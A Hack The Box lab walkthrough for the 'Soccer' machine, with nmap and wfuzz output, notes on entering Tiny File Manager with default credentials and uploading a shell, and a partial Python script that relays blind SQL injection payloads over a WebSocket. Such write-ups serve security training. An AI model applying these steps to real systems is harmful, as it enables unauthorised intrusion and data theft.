* Hack the Box Machine Resources

** Here the solution of machines from Hack The Box

_The intention is to have a kind of guidance and specially for the commands and tools_\
_used. To fully understand some of this topics, require documentation, reading and_ _practice._

_This Game is about get the flag.txt from the user and from the root so._
---

### SOCCER

* Level: easy
* IP: 10.10.11.194


``` bash
 Nmap 7.93 scan initiated Sun Jan  8 18:38:28 2023 as: nmap -v -sV -A -Pn -oN scanSimple 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=1/8%Time=63BAFFA4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x
SF:2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 18:38:57 2023 -- 1 IP address (1 host up) scanned in 29.28 seconds







❯ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://soccer.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220561

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                       
=====================================================================

000000001:   200        147 L    526 W      6917 Ch     "# directory-list-2.3-medium.txt"             
000000011:   200        147 L    526 W      6917 Ch     "# Priority ordered case sensative list, where
                                                         entries were found"                          
000000009:   200        147 L    526 W      6917 Ch     "# Suite 300, San Francisco, California, 94105
                                                        , USA."                                       
000000007:   200        147 L    526 W      6917 Ch     "# license, visit http://creativecommons.org/l
                                                        icenses/by-sa/3.0/"                           
000000013:   200        147 L    526 W      6917 Ch     "#"                                           
000000010:   200        147 L    526 W      6917 Ch     "#"                                           
000000003:   200        147 L    526 W      6917 Ch     "# Copyright 2007 James Fisher"               
000000012:   200        147 L    526 W      6917 Ch     "# on atleast 2 different hosts"              
000000014:   200        147 L    526 W      6917 Ch     "http://soccer.htb/"                          
000000006:   200        147 L    526 W      6917 Ch     "# Attribution-Share Alike 3.0 License. To vie
                                                        w a copy of this"                             
000000004:   200        147 L    526 W      6917 Ch     "#"                                           
000000005:   200        147 L    526 W      6917 Ch     "# This work is licensed under the Creative Co
                                                        mmons"                                        
000000008:   200        147 L    526 W      6917 Ch     "# or send a letter to Creative Commons, 171 S
                                                        econd Street,"                                
000000002:   200        147 L    526 W      6917 Ch     "#"                                           
000000064:   301        7 L      12 W       178 Ch      "tiny"     




```

* We found "tiny" as a directory with wfuzz 
* Below we see and research about tiny file manager vulnerability  and in this case we can login with 
* default credentials
* look for this vulnerability and follow intructions to upload the file in the server and the open it
* And wait with pwncat

![image](./assets/img/tinyFileManagerGoogle.png)

![image](./assets/img/soccershell.png)

![image](./assets/img/soccershell1.png)


``` bash

(remote) www-data@soccer:/$ cat /etc/hosts                                                            
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal

(remote) www-data@soccer:/$    

```

* Add soc-player.soccer.htb to our /etc/hosts
* We should easily fall in this site

![image](./assets/img/soccerSoc-playerhtb.png)

the source code reveals this

``` bash
            <div class="price pt-3 pl-3">
                    <span class="mb-2">Price</span>
                        <h5>Free</h5>
                </div>
            </div>
            <p>** Please don't forget your ticket number. **</p>
        </div>
    </div>
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
      

```


FOLLOW: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html



``` python

from http.server import SimpleHTTPRequestHandler
   2   │ from socketserver import TCPServer
   3   │ from urllib.parse import unquote, urlparse
   4   │ from websocket import create_connection
   5   │ 
   6   │ #ws_server = "ws://localhost:8156/ws"
   7   │ ws_server = "ws://soc-player.soccer.htb:9091"
   8   │ 
   9   │ def send_ws(payload):
  10   │     ws = create_connection(ws_server)
  11   │     # If the server returns a response on connect, use below line   
  12   │     #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
  13   │       
  14   │     # For our case, format the payload in JSON
  15   │     message = unquote(payload).replace('"','\'') # replacing " with ' to avoi
       │ d breaking JSON structure
         # data = '{"employeeID":"%s"}' % message-->
  16   │   data = '{"id":"%s"}' % message
  17   │ 
  18   │     ws.send(data)
  19   │     resp = ws.recv()
  20   │     ws.close()
  21   │ 
  22   │     if resp:
  23   │         return resp
  24   │     else:
  25   │         return ''

```

* pip install websocket
* pip3 install websocket-client

